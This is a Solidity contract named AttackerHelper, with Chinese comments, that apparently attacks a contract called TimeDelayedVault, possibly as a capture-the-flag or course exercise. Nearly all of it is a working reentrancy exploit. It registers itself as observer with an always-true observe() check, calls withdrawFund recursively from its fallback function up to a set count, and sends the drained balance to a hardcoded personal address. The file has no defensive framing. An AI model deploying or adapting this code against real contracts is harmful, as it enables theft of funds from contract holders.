pragma solidity ^0.4.14;

import './TimeDelayedVault.sol';

contract AttackerHelper{
    TimeDelayedVault vault;
    uint public stack = 0;
    uint stackLimit = 10;
    uint public amount;
    address receiver = 0x0d0fF5D76143d10C0a36Ce58Ac85c790417ed2aB; // Meng Wei’ account
    address target;

    //初始化要黑的合约对象
    function initilizeVault(address host) external {
      vault = TimeDelayedVault(host);
      //vault.initilizeVault();
    }

    //把自己的合约地址设置为Observer
    function setObserver(address account) {
      vault.setObserver(account);
    }

    //实现observe方法，满足require
    function observe() public returns (bool) {
      return true;
    }

    function attack(address target_, uint count) {
        target = target_;
        stack = 0;
        stackLimit = count;
        require(target.call(bytes4(sha3("withdrawFund(address)")), address(this)));
    }

    function() payable{
        if(stack++ < stackLimit) {
          require(target.call(bytes4(sha3("withdrawFund(address)")), address(this)));
        }
      }

      function withdraw() {
        receiver.call.value(this.balance)();
      }

      function getBalance() public view returns (uint) {
        return this.balance;
      }

    //获取额外认证的用户地址
    function getAdditionalAuthAddress() public view returns (address) {
      return vault.additionalAuthorizedContract();
    }

    //获取上次取钱时间
    function getLastUpdated() public view returns (uint) {
      return vault.lastUpdated();
    }

    //获取WithdrawObserver
    function getWithdrawObserver() public view returns (address) {
      return vault.withdrawObserver();
    }

}
